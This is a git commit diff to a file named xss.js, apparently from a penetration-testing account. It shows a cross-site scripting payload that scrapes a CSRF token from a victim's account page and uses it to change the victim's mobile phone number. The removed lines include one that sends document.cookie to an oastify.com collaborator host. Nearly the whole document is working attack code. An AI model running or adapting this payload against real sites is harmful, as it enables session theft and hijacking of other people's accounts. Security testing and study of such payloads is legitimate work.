92ef9fcee77a5bf7685b74d65972d3df7306cd1a
PentestTestingAcc <144997678+PentestTestingAcc@users.noreply.github.com>
2024-05-07 15:36:39 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,3 @@
-console.log(document.cookie)
 fetch('../../../my-account/update-email-address', {
   method: 'GET',
   headers: {
@@ -9,19 +8,39 @@ fetch('../../../my-account/update-email-address', {
   if (!response.ok) {
     throw new Error('Failed to fetch CSRF token');
   }
-  return response.json();
+  return response.text();
 })
 .then(json => {
-  console.log('JSON!');
-  console.log(json);
-  const htmlContent = json.htmlContent;
-  const parser = new DOMParser();
-  const htmlDoc = parser.parseFromString(htmlContent, 'text/html');
-  const csrfToken = htmlDoc.querySelector('input[name="CSRFToken"]').getAttribute('value');
-  console.log('CSRF Token:', csrfToken);
+	console.log(json)
+	const regex = /[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12}/;
+	let x = regex.exec(json);
+  console.log(x[0])
+  const url = '../../../my-account/update-mobile-phone';
+  const formData = new URLSearchParams();
+	formData.append('CSRFToken', x[0]);
+	formData.append('mobilePhone', '1234567890');
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: formData
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.text();
+  })
+  .then(data => {
+    console.log('Mobile phone is updated with response:', data);
+  })
+  .catch(error => {
+    console.error('Error updating mobile phone:', error);
+  });
 })
 .catch(error => {
-  console.error('Error:', error);
+  console.error('Error getting CSRF token from email page:', error);
 });
 
-fetch("https://95cvsl0mpa6yo13nnsxrpc53dujl7d61v.oastify.com?cookies="+document.cookie)
